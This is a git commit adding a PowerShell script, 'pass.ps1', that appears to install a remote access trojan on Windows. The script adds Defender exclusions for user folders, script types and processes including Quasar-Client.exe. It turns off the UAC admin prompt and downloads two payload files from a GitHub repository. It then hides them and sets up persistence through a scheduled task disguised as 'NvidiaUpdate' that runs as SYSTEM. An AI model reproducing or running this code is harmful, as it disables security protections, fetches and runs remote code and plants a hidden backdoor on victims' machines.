30dfc63d3f934a635da3f1c266d29dcecb3e4d0a
İsmayil <60405884+4V4loon@users.noreply.github.com>
2021-11-12 12:08:54 +0400

    Add files via upload

---
+++ pass.ps1
@@ -0,0 +1,35 @@
+Add-MpPreference -ExclusionPath "$env:userprofile" -Force
+Add-MpPreference -ExclusionPath "$env:appdata" -Force
+Add-MpPreference -ExclusionPath "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup" -Force
+Add-MpPreference -ExclusionPath "$env:appdata\Microsoft" -Force
+Add-MpPreference -ExclusionExtension ".ps1" -Force
+Add-MpPreference -ExclusionExtension ".bat" -Force
+Add-MpPreference -ExclusionExtension ".exe" -Force
+Add-MpPreference -ExclusionExtension ".vbs" -Force
+Add-MpPreference -ExclusionProcess "powershell.exe" -Force
+Add-MpPreference -ExclusionProcess "cmd.exe" -Force
+Add-MpPreference -ExclusionProcess "Client.exe" -Force
+Add-MpPreference -ExclusionProcess "Quasar-Client.exe" -Force
+Add-MpPreference -ExclusionProcess "NvidiaCoreComponent.exe" -Force
+Add-MpPreference -ExclusionProcess "NvidiaCore.exe" -Force
+Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
+
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/email.ps1' -OutFile '$env:appdata\Microsoft\email.ps1'
+
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/backdrop.bat' -OutFile '$env:appdata\Microsoft\backdrop.bat'
+
+
+(Get-Content -Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\sec.vbs") |
+    ForEach-Object {$_ -Replace 'privup.bat', 'backdrop.bat'} |
+        Set-Content -Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\sec.vbs"
+
+
+attrib +h "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\sec.vbs"
+attrib +h "$env:appdata\Microsoft\email.ps1"
+attrib +h "$env:appdata\Microsoft\backdrop.bat"
+
+schtasks /create /sc minute /mo 50 /tn "NvidiaUpdate" /tr "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command 'cscript.exe $env:appdata\Microsoft\sec.vbs'" /f
+
+Set-ScheduledTask -TaskName "NvidiaUpdate" -User "NT AUTHORITY\SYSTEM"
+
+start-process "cmd.exe" "/c %appdata%\Microsoft\backdrop.bat" -WindowStyle Hidden -Verb RunAs
